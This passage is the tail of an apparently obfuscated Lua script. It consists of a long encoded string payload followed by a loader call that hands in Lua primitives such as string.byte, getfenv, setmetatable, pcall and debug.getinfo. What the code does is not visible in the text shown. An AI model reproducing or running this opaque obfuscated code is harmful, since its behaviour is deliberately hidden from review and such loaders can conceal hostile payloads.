L3POK3P013PMH2BQ3FDR3ISG3KKN3LE23GPB3PQN3NV23PMP3PQQ3POW3PKV3PQU3PMW3PQW3PIT3I2N3PP33PN03PR13PP83PR33PJ53PR53FCG3PN93PR83PLD32SM3PRC3PAD32V43HS43CQI3HUJ3E3N3J103H3N3HSA3HUO3GDS3BLB3PRJ3PAO3PCY3AIZ3DJM3PRO3PLR3EZI3F7C3DLP3PPV3H1C3PRV3PPY3PK13CZT3PQ13PM43PS13P9N3PK83DH53POG3PQ93POI3I093IKS3PQE3P123M2339873CCT3HZ53HMF3HZ73CQH3PTE3HML3APG39MO35RW39JP3CY63EOM37RB3KWS3NCQ32I03EXR3F1G28P29C3A6C29G3IN032L83BKP3ASD3BKN3PSP2823PQV3PP13PSU3PQZ32VL3J4O3PL431JN3PP93PT03MH83MXJ3PSH3MEK3LEL3PRF3D9739N532GN3PHF1I3PIN2UP32L132VI32GN3PVU2X93N5P3ALD3DBV3NQ83CPL3CFS3PLA3PT33PR932IB21B32V439YQ3IRK2BF3I7K3PH73OY43LM73O863PHA3O9A3O8A3PHD3OYB3PVS3KDE3PNR3P3M3ATN3C7938WC3FJW3LLE3B2T3NL93PTQ39Q02F13NLX35ZO3J2I37U938W23K543CCB3AV13FC63LG23G3U3CMR3LT03LUC3AJ23FWP3AA83D0Y3BMI3FN135723BGG3CMR3ICO3BHB3FGF35FI3KLR3PX83KZC3NHG3JCC3PB43EM33MLJ3PK53BAS3DB13D7S3LXW319T3MYH3L1V3BAS3FH53MLR3O3H3NG629C332S3N9R3E483FR0332L3B363NOK3B44335V38BF3L2K3BHR3CUF32NV37F43BDA387S3MOT3A2R3IKC3AAK3IXP3FXN3O5A3JU32A53MR03BGP3BY33BDA39ZP3NGK3O4X3N8V3O4H3LVS3NSF331U3LVH3C293HLK3CCS3F9M3PUO3BKA3AYA3NF937TX3GA23BQS35763D5J3KX73HFE3JLX3EL532V4310F3PL63EVH3OLU384F3A663BTS3PW53CYE3DKQ3OI43EVG3PUX33P43D6Z32L432KL32KN3NIR32KS1I3CH1310Q3D6Y32KG3D6O32L53PV232L932LB3PV52BE3OQU3PJ33A6B29F32IB1V32V232OK3PSK23B21L3E2Y2BQ1F3Q143MVR3FVN39YR3PWF3C673PT73OQY3OOC27A2733Q013JPL32WX3M4M3PJ33HBQ3Q1C27E26N3Q1T3GLF32V42X33I7H32VI3J5P3Q182AJ23832IB2673Q1W3K2D3Q2823B25R3Q2A2533Q2A25B3Q2A24N3Q2A24V3Q2A2473Q2A24F3Q2A23R3Q2A23Z3Q2A23B26R32LP23J3Q2V3MG43Q2Y3BUC3Q3032NV3Q3227D22N3Q343G4H3Q37352V3Q3921J3Q3921R3Q392133Q3921B3Q391N3Q2V31TC3HNL27J3Q0B27Y3BOT3Q123Q3L3JP732VX32OK3Q391F3Q393FJ132LP2733Q3926F3Q3L3EP126N3Q3939T225Z3Q392673Q3925J3Q3925R3Q392533Q3925B3Q3924N3Q3924V3Q392473Q3924F3Q3923R3Q3L3BU93CPN23Z3Q4826Q3Q2W3Q503KIA22V3Q523BUC3Q5532NV3Q573Q353Q593G4H3Q5B39N232IB2273Q5D21J3Q5D21R3Q5D2133Q5D21B3Q5D2NY32M23Q5D1V3Q5D173Q5D1F3Q5D26V3Q5P3CQ327E2733Q5D26F3Q5D26N3Q5D25Z3Q5D2673Q5P3C6O32PH3Q5D25R3Q5D2533Q5D25B3Q5D24N3Q5P3C6V3P4L3DKY3OLR3DL13OLT3JKK3P4Q3H1V38ZL22632GU38Y33AGC3L9Q3NX53A3C3AN43KLB3AKJ3A453ONA3G6I3LGU3BCP2AP21S37KU3AA83Q7E2BM31TB3BWB3N3U3LT73FN53NX43PXZ3JBI3K6R3MJZ3G123KF43BWW3J9Z3BDW3G9Q38SG3NHQ333M33553B9A3ITJ3E1X3MZH3MBC3A4I2HX3Q8239PJ2BM3Q8A33C33C3K3IKM3JCW3COF27G3DAZ3CCS3DM327G3FKQ3MJU29Z3EXB29I3ATD38PK3AJS330O3E2636YW39WB3AUZ3OJU3EBO3CKV3B8E3CUR3CT23BHC2AU3A9P3B743NBA39WJ3FHB3MNC3DVS39623JFQ32553PYH3KBA3EJV3Q9339PB3Q953AUZ38F03AAY3FR93AIQ3JRL3IJU336Y3L4N330I3AXG387S3B2P33163L7X32ZX3B3C2UP3JDX3NAX3C8537RB3PYM3M0Q3EZR3ESJ3B3D3MN13LVP3Q9E3IGK3BY33B2P38CI3MOO382I332Z2B438ZV3D0Q3QAR3K9E3QAH3CCC37RM3Q913MOP3JDJ3K903QAK3NYO3K933LW93B963CLV3AA83QB73C9J3BY33B5K3NTS331U3PES3IXQ38U73J2G3D1L3K8E3IKC3B933NFQ3AA839CA3IFN38TH336C31223JF32AX3L4L3MJ83A1L3B6939UW39VL2AX33213BDN3QC03B2F2GF316U37ZZ37KN312231E7387J311S2NJ3B4W39UT333M3B4W3JET3QBR3L4G3QBU3MO23H4Y314P3KLM3QC0378N3QC23ON023A3QC53QBZ31NN3C3H332B3BDP2TM317T33783QCA31J633483QCE35D83E8D38043QCJ3KAE3QCL3QBT32ZU3QBV3Q7R3QBY3CK53QCS3CB03QC33CDT23A2NJ3QBP3QCH2BM3QBP3D872NJ3BYM38D431223DAS2XR2GF2UI36542F12GF37TC314Y38CG317T37U9399E38D4319A3KLM3186321Q35J72AX38DF3CCF38ED3QED3ATT2BM3QED33C32NJ38M137U9399U3CY131223C2G3CCS3C2G3BXT2NJ39AI358S37U93QF437U93C4U332V3QDG33B93QE33QDH314P3CB2332Z31223C4S38043C4N33C331223KQ138CO3FYL39PB3C4N3MO63CVT3D853A5O3NYE3JUO37GF3Q9R3JUM3C4H3MNR3JHB325538JK39WF3KPK3L7P3MAX3L2T3L4B3NYN3FRF3FO23OH33P243MAV3AIQ3BD73Q9G3L7238NO3QG73A1A3QG03JUK39IC3QG3359S3B2P39N93AB73QGG3OVR3QGI326L3IX73QGL3KCQ39HI3QGO395A3QGQ3KPG3BFY3QH33LW6372O38C43QGY3MXV3LIN326L3N1I3BWV3B2P3BH932G93QHF3KDU3QGA3IYD3ODT3KCG32553APP3QGX3QHS3QG93O3V326L39IH3QG83NA83MOH3FHF3QHO3IJQ3AZ63B4439SP3QI23QG4310F3IGS3QHW3MQB3FL73NYM3FY53E9229337F439PB3QIM3LVI3AC23Q972AP3QIO3OD92BM3QIO3MP33OE53MNO3FL13KC13BY33AXG3IH03L623KC637U43QIL3B8E3QIO3B213ATD38F03QHB3B2P3L683A173JAI3KPR3BC43B063L6A3AXG3DZF32KD2AF3QA43AYU3PZ73B6K3KBQ3JAQ3K9T3NOK3QJH3F4O38BF3FHQ3BHR3JGJ331B38KQ3B4438CT2HX3PZ23BWV3AXG3IHB3KCQ3JV43G0Z39UN33293IU92FS33PO3IY93BWV3B06344F3IYC34453QKM3C053B0634503IYC344Q39VJ3QK23ORZ3LIZ3L45326L3QAX3MPS3E483B443DVS3Q9X3A212UP3KCZ3QJ53E7X3NT737JD3KLR3QLG3C1U3QIY3KA53O453OSA3JSE3QL73QJ13B5A3AXG3JHK3QLD3EBO3A5H3CUS39O73BI13C4X37VR3OK527A346H317D3QBF3QI73QH83B44346S335V2X939I83NLX3IHJ3CF03A0J3B923QL52UP3BXY3BI33QDK33BN2GF3KQ13QCU3L0W2GF3KLM336F3QCT31ED3CB237S2312238OL3FXY38043QN13LON314P3AX638D42GF3QE1311131E73QE53111387S3MNS332L312H37U938FW37ZC31863KLM37SR3MZH31863QMY37RE3QNK3Q8B38P63BI13QBS3G1R3AJ538GI3BXN31ED37RD3D853QO33CTQ312238P927933553PX73QLZ3QCW3QIQ3QMZ35023BCF39VC3CJ73BCF3QOB37ZC2GF3Q8Y3QD13QN73CRU2GF3QFG3QOD3QO83D0Q3QOV33C33QFD3BHT3GGH39PB3QOV3C2929337R53D853QP63QLJ3K7A22V392A365I3E4T35QI3IIG3QIY3KPY3AVR3AXG347O3C9U3CI43A5H3BB53E8534893HU83L8E39JP3A4C3BD03BW83NRP3QJN3LWT2FS38W63QO938043QQ23AXC39SU37FA3AXG348I3QJJ334Y3B063IKQ3BY53L373PI73BWV3QDX3KER334Y38CG39BP3B9S3DVF3QM63IFX310P3JFP35D53PX438G52FS3BA53A253BY33B063MRQ36YI3QPZ3CAA2FS391F3QQ337U93QR73A163C012SF3IXP3QDY334Y3QQJ3J613KPN2X93BYM3A1Z2U037U9391737UK2TM316U33PO38482TM3QRP3QNU23B3QRW34O83LW53QRR3MP83A2V3111383K3AXR2TM38ZX3KLR3QS93A9Q37TC383I3QD33CH03AGR2TM3QS63A1X3QNF32P938Z42PT31EL3N7Y33603QSD3QNY3AZ6319A31NA34CJ359S3186316U3KCI3JAV3BC438FF3EN03BC439W63M8S3DDQ31EL3NH63QBE365I37U33DVC38YD3D853QTG3QQ63QQY3B9F3QR0310Q3EYN38YO3QR43CTQ2FS396Y3QR8333M3QTT3QRB3C1J3LIV32ZU3QRF359S3QRH3K3T3C9U3QRK3JV73O3A3AJ539663QRQ31NN34EV39KW2TM3QUA3QRX3QUG33492HX395T3KLR3QUL3CSJ3L6B32IY37283QSD330I3QSF3BZY39V03BWV3QSO3P8W3QUW3O3L335W3C05314C321Q34HE334Y389D39BP3QUU38EE3BQN3QQQ381L3DRI34I53JF42FS392W3D853QVJ3QTJ3BBF3LJ83AWU310Q34IZ3QS43QTQ3BZU2FS39EL3QTU388T3BI33QQX3BYH3QTZ3OQK3C053QU334LE3QU53FXE3FUQ3QU83AA839E73QUB316U3QUD3QRU23B3QWC3QRX3QWI3QUJ335O3GQH37U9325Q37SB3QUP2BQ3QUR3BWV3QVA34LO3MYZ3AVR3QUY3QN539VH3NY939GV3QV338H534L53QV72BQ3QV9318I3NGI3QTC3NAN3ABI34M83QVH23B39AP3D853QXI3QVM3BEM3QVO3B053DOP3AGR3QVT33IY2FS24G3BCF3QOA333M3QXU37ZC3QW03C4C3QW23ONX3QW42U034OH3ADK3QU63P873QWA380424I3BCF333U3QS23FIU37YU2TM3QYC3C7M37U93QYJ3AXR2HX24J3QWN3JJB3BI13QQS3ADJ3QWT3C053QVA39Z83QWX3AZ63QWZ34UR335J3QX23KFS3AM33QV427D34TC330I3QV83KNI317T3QXB2EZ3QXD3L4W34TN3C292FS24Z3NXJ37U93QZL3B583QY03D203QXN3AWY3JRA3QXQ2UP2X93QVU37N73QXV380423K3QVZ3QRC3QY23QQH3QY42UI34R73LIZ3QY83FOA3QYA37U923M3QYD2913QYF23B3QWF37S22TM3R0F3QYK333M3R0N3QYN23B23N3QYQ37SN3QYS3QWR27E3QYV3AM33QVA3ALG3QZ33C053QZ134UI3QZ33QV139E4359S3QZ73NW23BC43QZB3KLA3QZD3QQP3NHN3ABI3DA53QZJ23B2433QZM333M3R1N3QZP3KPO3A1X3QZS3B0634Z538DJ3QXR2G522O37KU3QXW331N37KU333E3QZQ3CSM3QRD33263QU1330I3QU334ZO3QY73QW83C983R0D3PPP37KU3QYE3QUC3QYH2LH37KU3QEP336137KU3QWL22R37KU39P33R2T3QWQ3QQT3R0Z3BD03QVA35083R133AM33QZ1350Q3QX13R1838RG3R1A38H53519359S3R1E3ILF3R1G3IHU3QVD3ABI351R3R1L23737KU3CCS3R3M3R1R3QTK3R1U310Q352A3R1X3QZW3CKA2FS3Q7H3QF5333M3R3Z3R253R043R1S3NS63AZ63QU335313R0A3R2F39ZE3FXE3BXY3R2J3R0H3R2L3ATQ2TM21U3R2O3QN33R2R332Z2HX21V3R2U38043R4Q3R2X3QYU343S334Y3QVA353U3R333BD03QZ13JQ63DDQ3R3839EI334Y3R1B33BY3QX727E3QX93R3G3JSI3R3I3L4W35693CY12FS22B3R3N3FW93Q7F3QBH3D8B3E2M',{},40,2^16,{},"\115\116\114\105\110\103",'',string.byte,string.char,string.sub,table.concat,(math.ldexp or(function(a,b)return a*(2^b);end)),(getfenv or function()_ENV['\95\69\78\86']=_ENV;return _ENV end),setmetatable,select,next,math.floor,string.format,(unpack or table.unpack),tonumber,table.insert,string.gmatch,tostring,type,_VERSION,pcall,string.match,string.find,(debug.getinfo or debug.info),string.len,rawset,string.gsub,math.random,(table.find or function(a,b)for c,d in next,a do if d==b then return c;end;end return nil;end),rawget,_G,print,setfenv);end;
